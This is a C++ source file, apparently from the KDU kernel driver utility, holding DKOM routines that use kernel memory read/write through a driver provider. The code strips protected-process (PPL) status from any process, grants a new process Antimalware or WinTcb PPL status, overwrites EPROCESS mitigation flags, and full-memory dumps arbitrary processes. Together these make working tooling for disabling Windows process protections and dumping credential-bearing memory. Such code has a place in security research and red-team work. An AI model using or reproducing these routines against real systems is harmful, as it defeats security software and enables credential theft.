/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2018 - 2025
*
*  TITLE:       PS.CPP
*
*  VERSION:     1.44
*
*  DATE:        01 Nov 2025
*
*  Processes DKOM related routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include <Dbghelp.h>

typedef BOOL(WINAPI* pfnMiniDumpWriteDump)(
    _In_ HANDLE hProcess,
    _In_ DWORD ProcessId,
    _In_ HANDLE hFile,
    _In_ MINIDUMP_TYPE DumpType,
    _In_opt_ PMINIDUMP_EXCEPTION_INFORMATION ExceptionParam,
    _In_opt_ PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam,
    _In_opt_ PMINIDUMP_CALLBACK_INFORMATION CallbackParam);

LPCSTR KDUGetProtectionTypeAsString(
    _In_ ULONG Type
)
{
    LPCSTR typeStrings[] = {
        "PsProtectedTypeNone",
        "PsProtectedTypeProtectedLight",
        "PsProtectedTypeProtected"
    };

    return (Type <= PsProtectedTypeProtected) ? typeStrings[Type] : "Unknown Type";
}

LPCSTR KDUGetProtectionSignerAsString(
    _In_ ULONG Signer
)
{
    static LPCSTR signerStrings[] = {
        "PsProtectedSignerNone",
        "PsProtectedSignerAuthenticode",
        "PsProtectedSignerCodeGen",
        "PsProtectedSignerAntimalware",
        "PsProtectedSignerLsa",
        "PsProtectedSignerWindows",
        "PsProtectedSignerWinTcb",
        "PsProtectedSignerWinSystem",
        "PsProtectedSignerApp"
    };

    return (Signer <= PsProtectedSignerApp) ? signerStrings[Signer] : "Unknown Value";
}

/*
* KDUDumpProcessMemory
*
* Purpose:
*
* Dump process memory.
*
*/
BOOL KDUDumpProcessMemory(
    _In_ PKDU_CONTEXT Context,
    _In_ HANDLE ProcessId
)
{
    BOOL bResult = FALSE;
    HMODULE dbgModule = NULL;
    HANDLE hFile = INVALID_HANDLE_VALUE;
    HANDLE processHandle = NULL;
    pfnMiniDumpWriteDump pMiniDumpWriteDump;

    WCHAR szOutputName[MAX_PATH];
    PSYSTEM_PROCESS_INFORMATION procEntry = NULL;
    PVOID procBuffer = supGetSystemInfo(SystemProcessInformation);

    if (!procBuffer) {
        supPrintfEvent(kduEventError, "Cannot allocate process list\r\n");
        return FALSE;
    }

    do {
        if (!ntsupQueryProcessEntryById(ProcessId, (PBYTE)procBuffer, &procEntry)) {
            supPrintfEvent(kduEventError,
                "The %lX process doesn't exist in process list\r\n",
                HandleToUlong(ProcessId));
            break;
        }

        supPrintfEvent(kduEventInformation, "[+] Dumping memory of the process 0x%lX (%wZ)\r\n",
            HandleToUlong(ProcessId), procEntry->ImageName);

        dbgModule = LoadLibraryEx(L"dbghelp.dll", NULL, LOAD_LIBRARY_SEARCH_SYSTEM32);
        if (dbgModule == NULL) {
            supShowWin32Error("[!] Cannot load dbghelp.dll", GetLastError());
            break;
        }

        pMiniDumpWriteDump = (pfnMiniDumpWriteDump)GetProcAddress(dbgModule, "MiniDumpWriteDump");
        if (pMiniDumpWriteDump == NULL) {
            supShowWin32Error("[!] Dump function is not found", GetLastError());
            break;
        }

        bResult = KDUOpenProcess(Context, ProcessId, PROCESS_ALL_ACCESS, &processHandle);
        if (!bResult || processHandle == NULL) {
            supShowWin32Error("[!] Cannot open process", GetLastError());
            break;
        }

        StringCchPrintf(szOutputName,
            RTL_NUMBER_OF(szOutputName),
            TEXT("vmem_pid_%lX.dmp"),
            HandleToUlong(ProcessId));

        hFile = CreateFile(szOutputName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        if (hFile == INVALID_HANDLE_VALUE) {
            supShowWin32Error("[!] Cannot write memory dump", GetLastError());
            break;
        }

        bResult = pMiniDumpWriteDump(processHandle,
            0,
            hFile,
            MiniDumpWithFullMemory,
            NULL,
            NULL,
            NULL);

        if (bResult) {
            supPrintfEvent(kduEventInformation, "[+] Process memory dumped to %ws\r\n", szOutputName);
        }
        else {
            supShowWin32Error("[!] Cannot dump process", GetLastError());
        }

    } while (FALSE);

    supHeapFree(procBuffer);
    if (processHandle) NtClose(processHandle);
    if (hFile != INVALID_HANDLE_VALUE) CloseHandle(hFile);
    if (dbgModule) FreeLibrary(dbgModule);

    return bResult;
}

/*
* KDURunCommandPPL
*
* Purpose:
*
* Start a Process as PPL-Antimalware
*
*/
BOOL KDURunCommandPPL(
    _In_ PKDU_CONTEXT Context,
    _In_ LPWSTR CommandLine,
    _In_ BOOL HighestSigner)
{
    DWORD dwThreadResumeCount = 0;

    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    RtlZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    RtlZeroMemory(&pi, sizeof(pi));

    wprintf_s(L"[+] Creating Process '%s'\r\n", CommandLine);

    if (!CreateProcess(
        NULL,               // No module name (use command line)
        CommandLine,        // Command line
        NULL,               // Process handle not inheritable
        NULL,               // Thread handle not inheritable
        FALSE,              // Set handle inheritance to FALSE
        CREATE_SUSPENDED,   // Create Process suspended so we can edit
        // its protection level prior to starting
        NULL,               // Use parent's environment block
        NULL,               // Use parent's starting directory 
        &si,                // Pointer to STARTUPINFO structure
        &pi))
    {
        supShowWin32Error("[!] Failed to create process", GetLastError());
        return FALSE;
    }

    printf_s("[+] Created Process with PID %lu\r\n", pi.dwProcessId);

    PS_PROTECTED_SIGNER signer;
    PS_PROTECTED_TYPE type;
    if (HighestSigner) { // the highest observed protection is WinTcb(6)/ProtectedLight(1)
        signer = PsProtectedSignerWinTcb;
        type = PsProtectedTypeProtectedLight;
    }
    else {
        signer = PsProtectedSignerAntimalware;
        type = PsProtectedTypeProtectedLight;
    }

    if (!KDUControlProcessProtections(Context, pi.dwProcessId, signer, type)) {
        supShowWin32Error("[!] Failed to set process as PPL", GetLastError());
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return FALSE;
    }

    dwThreadResumeCount = ResumeThread(pi.hThread);
    if (dwThreadResumeCount != 1) {
        printf_s("[!] Failed to resume process: %lu | 0x%lX\n", dwThreadResumeCount, GetLastError());
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return FALSE;
    }

    // Wait until child process exits.
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Close process and thread handles.
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return TRUE;
}

/*
* KDUUnprotectProcess
*
* Purpose:
*
* Modify process object to remove PsProtectedProcess access restrictions.
*
*/
BOOL KDUUnprotectProcess(
    _In_ PKDU_CONTEXT Context,
    _In_ ULONG_PTR ProcessId)
{
    return KDUControlProcessProtections(Context, ProcessId, PsProtectedSignerNone, PsProtectedTypeNone);
}

/*
* KDUUnmitigateProcess
*
* Purpose:
*
* Modify process object to remove process mitigations.
*
*/
BOOL KDUUnmitigateProcess(
    _In_ PKDU_CONTEXT Context,
    _In_ ULONG_PTR ProcessId,
    _In_ ULONG PsNewMitigations,
    _In_ INT TargetedFlags)
{
    return KDUControlProcessMitigationFlags(Context, ProcessId, PsNewMitigations, TargetedFlags);
}

/*
* printProtection
*
* Purpose:
*
* Print process protection with string descriptions.
*
*/
VOID printProtection(
    _In_ ULONG Buffer
)
{
    PS_PROTECTION* PsProtection = (PS_PROTECTION*)&Buffer;

    printf_s("\tPsProtection->Type: %lu (%s)\r\n",
        PsProtection->Type,
        KDUGetProtectionTypeAsString(PsProtection->Type));

    printf_s("\tPsProtection->Signer: %lu (%s)\r\n",
        PsProtection->Signer,
        KDUGetProtectionSignerAsString(PsProtection->Signer));

    printf_s("\tPsProtection->Audit: %lu\r\n", PsProtection->Audit);
}

/*
* printProtection
*
* Purpose:
*
* Print ProcessMitigationsFlags2 value.
*
*/
VOID printMitigationFlags(
    _In_ INT Index,
    _In_ ULONG Buffer
)
{
    // PS_MITIGATION* PsMitigation = (PS_MITIGATION*)&Buffer; // TODO parse?
    printf_s("\tPsMitigationFlags%i: 0x%lX\r\n", Index, Buffer);
}

/*
* KDUGetProtectionOffset
*
* Purpose:
*
* Get PS_PROTECTION offset for specific Windows version.
*
*/
ULONG_PTR KDUGetProtectionOffset(
    _In_ ULONG NtBuildNumber
)
{
    switch (NtBuildNumber) {
    case NT_WIN8_BLUE:
        return PsProtectionOffset_9600;
    case NT_WIN10_THRESHOLD1:
        return PsProtectionOffset_10240;
    case NT_WIN10_THRESHOLD2:
        return PsProtectionOffset_10586;
    case NT_WIN10_REDSTONE1:
        return PsProtectionOffset_14393;
    case NT_WIN10_REDSTONE2:
    case NT_WIN10_REDSTONE3:
    case NT_WIN10_REDSTONE4:
    case NT_WIN10_REDSTONE5:
    case NT_WIN10_19H1:
    case NT_WIN10_19H2:
        return PsProtectionOffset_15063;
    case NT_WIN10_20H1:
    case NT_WIN10_20H2:
    case NT_WIN10_21H1:
    case NT_WIN10_21H2:
    case NT_WIN10_22H2:
    case NT_WIN11_21H2:
    case NT_WIN11_22H2:
    case NT_WIN11_23H2:
        return PsProtectionOffset_19041;
    case NT_WIN11_24H2:
    case NT_WIN11_25H2:
        return PsProtectionOffset_26100;
    default:
        return 0;
    }
}

/*
* KDUControlProcessProtections
*
* Purpose:
*
* Modify process object to remove PsProtectedProcess access restrictions.
*
*/
BOOL KDUControlProcessProtections(
    _In_ PKDU_CONTEXT Context,
    _In_ ULONG_PTR ProcessId,
    _In_ PS_PROTECTED_SIGNER PsProtectionSigner,
    _In_ PS_PROTECTED_TYPE PsProtectionType)
{
    BOOL       bResult = FALSE;
    ULONG      Buffer;
    NTSTATUS   ntStatus;
    ULONG_PTR  ProcessObject = 0, VirtualAddress = 0, Offset = 0;
    HANDLE     hProcess = NULL;

    CLIENT_ID clientId;
    OBJECT_ATTRIBUTES obja;

    FUNCTION_ENTER_MSG(__FUNCTION__);

    InitializeObjectAttributes(&obja, NULL, 0, 0, 0);

    clientId.UniqueProcess = (HANDLE)ProcessId;
    clientId.UniqueThread = NULL;

    ntStatus = NtOpenProcess(&hProcess, PROCESS_QUERY_LIMITED_INFORMATION,
        &obja, &clientId);

    if (NT_SUCCESS(ntStatus)) {

        printf_s("[+] Process with PID %llu opened (PROCESS_QUERY_LIMITED_INFORMATION)\r\n", ProcessId);
        bResult = supQueryObjectFromHandle(hProcess, &ProcessObject);

        if (bResult && (ProcessObject != 0)) {

            printf_s("[+] Process object (EPROCESS) found, 0x%llX\r\n", ProcessObject);

            Offset = KDUGetProtectionOffset(Context->NtBuildNumber);
            if (Offset == 0) {

                supPrintfEvent(kduEventError,
                    "[!] Unsupported WinNT version\r\n");

            }
            else {

                VirtualAddress = EPROCESS_TO_PROTECTION(ProcessObject, Offset);

                printf_s("[+] EPROCESS->PS_PROTECTION, 0x%llX\r\n", VirtualAddress);

                Buffer = 0;

                if (Context->Provider->Callbacks.ReadKernelVM(Context->DeviceHandle,
                    VirtualAddress,
                    &Buffer,
                    sizeof(ULONG)))
                {
                    printf_s("[+] Kernel memory read at %p succeeded\r\n", (void*)VirtualAddress);
                    printProtection(Buffer);

                    Buffer = (Buffer & 0xFFFFFF00) | ((PsProtectionSigner << 4) | (PsProtectionType & 0x7));

                    bResult = Context->Provider->Callbacks.WriteKernelVM(Context->DeviceHandle,
                        VirtualAddress,
                        &Buffer,
                        sizeof(UCHAR));

                    if (bResult) {
                        printf_s("[+] Process object modified\r\n");

                        ULONG verifyBuf = 0;
                        if (Context->Provider->Callbacks.ReadKernelVM(Context->DeviceHandle,
                            VirtualAddress,
                            &verifyBuf,
                            sizeof(UCHAR)))
                        {
                            printf_s("[+] Kernel memory read at %p succeeded\r\n", (void*)VirtualAddress);
                            printf_s("\tNew PsProtection: 0x%02X\n", verifyBuf & 0xff);
                            printProtection(verifyBuf);
                        }
                    }
                    else {

                        supPrintfEvent(kduEventError,
                            "[!] Cannot modify process object\r\n");

                    }
                }
                else {

                    supPrintfEvent(kduEventError,
                        "[!] Cannot read kernel memory\r\n");

                }
            }
        }
        else {
            supPrintfEvent(kduEventError,
                "[!] Cannot query process object\r\n");
        }
        NtClose(hProcess);
    }
    else {
        supShowHardError("[!] Cannot open target process", ntStatus);
    }

    FUNCTION_LEAVE_MSG(__FUNCTION__);

    return bResult;
}

/*
* KDUControlProcessMitigationFlags
*
* Purpose:
*
* Modify process object to remove process MitigationFlags.
*
*/
BOOL KDUControlProcessMitigationFlags(
    _In_ PKDU_CONTEXT Context,
    _In_ ULONG_PTR ProcessId,
    _In_ ULONG PsNewMitigations,
    _In_ INT TargetedFlags)
{
    BOOL       bResult1 = FALSE;
    BOOL       bResult2 = FALSE;
    ULONG      Buffer1, Buffer2;
    NTSTATUS   ntStatus;
    ULONG_PTR  ProcessObject = 0, VirtualAddress1 = 0, VirtualAddress2 = 0, Offset1 = 0, Offset2 = 0;
    HANDLE     hProcess = NULL;

    CLIENT_ID clientId;
    OBJECT_ATTRIBUTES obja;

    FUNCTION_ENTER_MSG(__FUNCTION__);

    InitializeObjectAttributes(&obja, NULL, 0, 0, 0);

    clientId.UniqueProcess = (HANDLE)ProcessId;
    clientId.UniqueThread = NULL;

    ntStatus = NtOpenProcess(&hProcess, PROCESS_QUERY_LIMITED_INFORMATION,
        &obja, &clientId);

    if (NT_SUCCESS(ntStatus)) {

        printf_s("[+] Process with PID %llu opened (PROCESS_QUERY_LIMITED_INFORMATION)\r\n", ProcessId);
        bResult1 = supQueryObjectFromHandle(hProcess, &ProcessObject);

        if (bResult1 && (ProcessObject != 0)) {

            printf_s("[+] Process object (EPROCESS) found, 0x%llX\r\n", ProcessObject);

            switch (Context->NtBuildNumber) {
                //Started from RS3
            case NT_WIN10_REDSTONE3:
            case NT_WIN10_REDSTONE4:
                Offset1 = PsMitigationFlags1Offset_RS3;
                Offset2 = PsMitigationFlags2Offset_RS3;
                break;
            case NT_WIN10_REDSTONE5:
                Offset1 = PsMitigationFlags1Offset_RS5;
                Offset2 = PsMitigationFlags2Offset_RS5;
                break;
            case NT_WIN10_19H1:
            case NT_WIN10_19H2:
                Offset1 = PsMitigationFlags1Offset_18362;
                Offset2 = PsMitigationFlags2Offset_18362;
                break;
            case NT_WIN10_20H1:
            case NT_WIN10_20H2:
            case NT_WIN10_21H1:
            case NT_WIN10_21H2:
            case NT_WIN10_22H2:
            case NT_WIN11_21H2:
            case NT_WIN11_22H2:
            case NT_WIN11_23H2:
                Offset1 = PsMitigationFlags1Offset_19041;
                Offset2 = PsMitigationFlags2Offset_19041;
                break;
            case NT_WIN11_24H2:
            case NT_WIN11_25H2:
                Offset1 = PsMitigationFlags1Offset_26100;
                Offset2 = PsMitigationFlags2Offset_26100;
                break;
            default:
                Offset1 = Offset2 = 0;
                break;
            }

            if (Offset1 == 0 || Offset2 == 0) {

                supPrintfEvent(kduEventError,
                    "[!] Unsupported WinNT version\r\n");

            }
            else {

                VirtualAddress1 = EPROCESS_TO_MITIGATIONFLAGS(ProcessObject, Offset1);
                VirtualAddress2 = EPROCESS_TO_MITIGATIONFLAGS(ProcessObject, Offset2);

                printf_s("[+] EPROCESS->PS_MITIGATION_FLAGS1, 0x%llX\r\n", VirtualAddress1);
                printf_s("[+] EPROCESS->PS_MITIGATION_FLAGS2, 0x%llX\r\n", VirtualAddress2);

                Buffer1 = Buffer2 = 0;

                bResult1 = Context->Provider->Callbacks.ReadKernelVM(Context->DeviceHandle,
                    VirtualAddress1,
                    &Buffer1,
                    sizeof(ULONG));

                bResult2 = Context->Provider->Callbacks.ReadKernelVM(Context->DeviceHandle,
                    VirtualAddress2,
                    &Buffer2,
                    sizeof(ULONG));

                if (bResult1 && bResult2)
                {
                    printf_s("[+] Kernel memory read at %p succeeded\r\n", (void*)VirtualAddress1);
                    printMitigationFlags(1, Buffer1);
                    printf_s("[+] Kernel memory read at %p succeeded\r\n", (void*)VirtualAddress2);
                    printMitigationFlags(2, Buffer2);

                    Buffer1 = Buffer2 = PsNewMitigations;

                    if (TargetedFlags & PS_MITIGATION_FLAGS1) {
                        printf_s("[+] Overwriting MitigationFlags1\r\n");
                        bResult1 = Context->Provider->Callbacks.WriteKernelVM(Context->DeviceHandle,
                            VirtualAddress1,
                            &Buffer1,
                            sizeof(ULONG));
                    }

                    if (TargetedFlags & PS_MITIGATION_FLAGS2) {
                        printf_s("[+] Overwriting MitigationFlags2\r\n");
                        bResult2 = Context->Provider->Callbacks.WriteKernelVM(Context->DeviceHandle,
                            VirtualAddress2,
                            &Buffer2,
                            sizeof(ULONG));
                    }

                    if (bResult1 && bResult2) {
                        printf_s("[+] Process object(s) modified\r\n");

                        ULONG verifyBuf1 = 0xDEADBEEF; // if DEADBEEF is in output, read failed, this is a sanity check
                        if (Context->Provider->Callbacks.ReadKernelVM(Context->DeviceHandle,
                            VirtualAddress1,
                            &verifyBuf1,
                            sizeof(ULONG)))
                        {
                            printf_s("[+] Kernel memory read at %p succeeded\r\n", (void*)VirtualAddress1);
                            printMitigationFlags(1, verifyBuf1);
                        }

                        ULONG verifyBuf2 = 0xDEADBEEF;
                        if (Context->Provider->Callbacks.ReadKernelVM(Context->DeviceHandle,
                            VirtualAddress2,
                            &verifyBuf2,
                            sizeof(ULONG)))
                        {
                            printf_s("[+] Kernel memory read at %p succeeded\r\n", (void*)VirtualAddress2);
                            printMitigationFlags(2, verifyBuf2);
                        }

                    }
                    else {

                        supPrintfEvent(kduEventError,
                            "[!] Cannot modify process object\r\n");

                    }
                }
                else {

                    supPrintfEvent(kduEventError,
                        "[!] Cannot read kernel memory\r\n");

                }
            }
        }
        else {
            supPrintfEvent(kduEventError,
                "[!] Cannot query process object\r\n");
        }
        NtClose(hProcess);
    }
    else {
        supShowHardError("[!] Cannot open target process", ntStatus);
    }

    FUNCTION_LEAVE_MSG(__FUNCTION__);

    return bResult1 && bResult2;
}
